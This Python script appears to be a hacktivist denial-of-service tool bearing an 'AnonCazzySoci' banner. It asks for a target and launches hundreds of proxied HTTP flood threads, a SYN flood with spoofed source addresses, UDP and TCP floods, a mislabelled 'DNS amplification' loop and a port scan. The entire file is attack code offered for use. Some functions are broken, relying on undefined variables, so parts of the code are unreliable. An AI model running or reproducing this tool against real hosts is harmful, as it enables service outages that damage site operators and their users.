import socket
import random
import requests
import threading
import subprocess
import time
from scapy.all import *

credit = """
\033[1;36m
▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓ 
  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░ 
                                         ░                  ░        ░         ░ ░                       ░           
╔════════════════════════╗
║ Created by: CazzySoci  ║
║                        ║
║      𝓦𝓔𝓛𝓒𝓞𝓜𝓔           ║
║                        ║
║  We Are AnonCazzySoci  ║
║    •We don't die       ║
║    •We Multiply        ║
║    •Expect us!         ║
╚════════════════════════╝
\033[1;36m
"""
print(credit)
target_url = input("Target url: ")
start_port = 1
end_port = 100
fake_ip = '66.118.234.34:22'

def generate_user_agent():
    with open("ua.txt", "r") as file:
        user_agents = file.read().splitlines()
    return random.choice(user_agents)

def send_get_request(url, proxy):
    headers = {
        "User-Agent": generate_user_agent()
    }
    proxies = {
        "http": proxy,
        "https": proxy
    }
    response = requests.get(url, headers=headers, proxies=proxies)
    return response

def generate_malicious_ip():
    ip_list = []
    for _ in range(10000):  
        ip = ""
        for _ in range(4):
            ip += str(random.randint(1, 255)) + "."
        ip = ip[:-1]
        ip_list.append(ip)
    return ip_list

def perform_ddos_attack(proxy_list, bot_count):
    while True:
        url = f"http://{target_url}"
        if target_url.startswith("https"):
            url = f"https://{target_url}"
        
        proxy = random.choice(proxy_list)
        response = send_get_request(url, proxy)
        print(f"Botnet {bot_count}: DDoS attack on {url} using proxy {proxy}...")

        time.sleep(0.001) 

def scan_ports():
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_url, port))
        if result == 0:
            print(f"Port {port} is open")
        sock.close()

def dns_amplification_attack(target_ip):
    target_port = 53
    query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04test\x03com\x00\x00\x01\x00\x01"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        sock.sendto(query, (target_ip, target_port))

def syn_flood_attack(target_ip):
    target_port = 80
    
    while True:
        ip = IP(src=RandIP(), dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        packet = ip / tcp
        send(packet)

def http_flood_attack(target_url):
    while True:
        response = requests.get(target_url)
        print(f"HTTP Flood Attack on {target_url}...")

def send_udp_packets():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(random.randint(0, 255) for _ in range(65535)), (target_ip, target_port))

def send_tcp_syn_packets():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.send(b"SYN Flood Attack")

def send_http_get_requests():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        request = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
        sock.send(request)

def execute_script():
    # Read the proxy list from a txt file
    proxy_list = []
    with open("cazzy.txt", "r") as file:
        proxy_list = file.read().splitlines()

    udp_thread = threading.Thread(target=send_udp_packets)
    tcp_syn_thread = threading.Thread(target=send_tcp_syn_packets)
    http_thread = threading.Thread(target=send_http_get_requests)

    udp_thread.start()
    tcp_syn_thread.start()
    http_thread.start()

    botnet_count = 0
    ddos_attack_threads = []
    for _ in range(500):
        botnet_count += 1
        ddos_attack_thread = threading.Thread(target=perform_ddos_attack, args=(proxy_list, botnet_count))
        ddos_attack_threads.append(ddos_attack_thread)

    for thread in ddos_attack_threads:
        thread.start()

    scan_ports()

    dns_amplification_thread = threading.Thread(target=dns_amplification_attack, args=(target_url,))
    dns_amplification_thread.start()

    syn_flood_thread = threading.Thread(target=syn_flood_attack, args=(target_url,))
    syn_flood_thread.start()

    http_flood_thread = threading.Thread(target=http_flood_attack, args=(target_url,))
    http_flood_thread.start()

    for thread in ddos_attack_threads:
        thread.join()
    dns_amplification_thread.join()
    syn_flood_thread.join()
    http_flood_thread.join()

if __name__ == "__main__":
    execute_script()
